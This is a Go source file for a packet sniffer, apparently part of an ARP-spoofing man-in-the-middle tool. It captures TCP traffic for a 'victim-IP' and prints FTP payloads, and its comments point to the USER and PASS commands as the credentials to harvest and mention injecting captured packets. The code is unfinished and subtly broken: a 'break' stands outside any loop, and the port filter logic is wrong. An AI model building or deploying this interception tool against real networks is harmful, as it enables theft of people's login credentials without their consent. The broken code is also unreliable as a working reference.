package main
/* package sniffer */

import (
	"time"
	"os"
	"fmt"
	"log"
	"errors"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
        "github.com/google/gopacket/pcap"
)

var (	
	snaplen int32 = 1024
	promisc bool  = false
	timeout time.Duration = pcap.BlockForever
)

/* 
** Loops through array of available interfaces on host,
** then chooses first one that is not loopback (lo0)
 */

func selectInterface() (pcap.Interface, error) {
	ifaces, err := pcap.FindAllDevs()
	if err != nil {
		return pcap.Interface{}, err
	}
	for _, iface := range ifaces {
		if iface.Name != "lo0" && iface.Name != "lo" {
			return iface, nil
		}
	}
	return pcap.Interface{}, errors.New("could not find valid network interface")
}

func parseCaughtPacket(packet gopacket.Packet) {
	transportLayer := packet.Layer(layers.LayerTypeTCP)

	/*testPrintPacket(packet)*/
	if transportLayer != nil {
		fmt.Println("Packet has a TCP layer")
		tcp, _ := transportLayer.(*layers.TCP)	
		if tcp.SrcPort != 21 || tcp.DstPort != 21 {
			break
		}
		
		appLayer := packet.ApplicationLayer()
		if appLayer != nil {
			fmt.Printf("Payload: %s\n", appLayer.Payload())
			/*
			   ** USER, PASS for credentials
			   ** RETR, STOR for file ops.
			 */
		}
	}

	/*
        **     ~~ TO TEST WITH ARP SPOOFER ~~
	**    test if needed to inject captured packets
	**    into network with fixed ethernet frame
	*/

	/* func (p *Handle) WritePacketData(data []byte) (err error) */
}

func testPrintPacket(packet gopacket.Packet) {
	ethLay := packet.Layer(layers.LayerTypeEthernet)
	if ethLay != nil {
		fmt.Println(" ~~ ETH layer ~~")
		eth, _ := ethLay.(*layers.Ethernet)
		fmt.Printf("src: %s, dst: %s\n", eth.SrcMAC, eth.DstMAC)
	}
	ipLay := packet.Layer(layers.LayerTypeIPv4)
	if ipLay != nil {
		fmt.Println(" ~~ IP layer ~~")
		ip, _ := ipLay.(*layers.IPv4)
		fmt.Printf("src: %s, dst: %s\n", ip.SrcIP, ip.DstIP)
	}
	tcpLay := packet.Layer(layers.LayerTypeTCP)
	if tcpLay != nil {
		fmt.Println(" ~~ TCP layer ~~")
		tcp, _ := tcpLay.(*layers.TCP)
		fmt.Printf("src: %d, dst: %d\n", tcp.SrcPort, tcp.DstPort)
	}
	appLay := packet.ApplicationLayer()
	if appLay != nil {
		fmt.Println(" ~~ App. layer ~~")
		fmt.Printf("%s\n", appLay.Payload())
	}
}

func usage() {
	fmt.Fprintf(os.Stderr, "usage: %s [victim-IP] [victim-MAC] [server-MAC]\n", os.Args[0])
	os.Exit(1)
}

/* [victim-IP] [victim-MAC] [server-MAC] */
func main() /*Sniffer*/ {
	if len(os.Args[1:]) != 3 {
		usage()
	}
	var filter string = "tcp and host " + os.Args[1]
	iface, err := selectInterface()
	if err != nil {
		log.Fatal(err)
	}
	dev  := iface.Name
	handle, err := pcap.OpenLive(dev, snaplen, promisc, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	err = handle.SetBPFFilter(filter)
	if err != nil {
		log.Fatal(err)
	}
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	/* open log file */
	for packet := range packetSource.Packets() {
		fmt.Printf("~~ MONITORING NETWORK ~~\n")
		parseCaughtPacket(packet)
	}
}
